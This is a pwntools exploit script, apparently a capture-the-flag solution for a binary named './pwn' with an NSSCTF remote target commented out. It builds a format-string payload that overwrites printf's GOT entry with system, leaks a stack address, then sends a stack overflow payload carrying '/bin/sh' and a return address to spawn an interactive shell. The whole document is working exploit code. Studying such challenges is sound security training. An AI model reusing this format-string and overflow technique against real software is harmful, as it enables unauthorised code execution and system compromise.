from pwn import *

context(os='linux', arch='amd64', kernel='amd64',log_level='debug')



io=gdb.debug('./pwn','''
            break main
            break vuln
            break *0x4007C8
            ''')


io=process('./pwn')

#gdb.attach(io)
#io=remote('node4.anna.nssctf.cn',28799)
elf=ELF('./pwn')
s,sl,sa,sla = io.send, io.sendline, io.sendafter, io.sendlineafter
r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil


printf=elf.got['printf']
system=elf.plt['system']

#system=0x40085D
#system=0x4005E0
print(hex(system))

ru(b'name:')


payload1=b'%16$paaa'
payload1+=fmtstr_payload(7,{printf:system},numbwritten=17,write_size='short')

print(payload1)
sl(payload1)


ru(b'hello,')
#rl()


ru(b'0x')
rbp= int(io.recv(12).rjust(16,b'0'),16)
print(hex(rbp))
ru(b'keep on !')

#sl(b'/bin/sh\x00'+b'a'*(0x60-len(b'/bin/sh\x00')-8)+p64(0x4007BC))
s(b'/bin/sh\x00'*4+b'a'*(0x60-len(b'/bin/sh\x00'*4)-8-8)+p64(rbp)+p64(0x4007BC))


io.interactive()




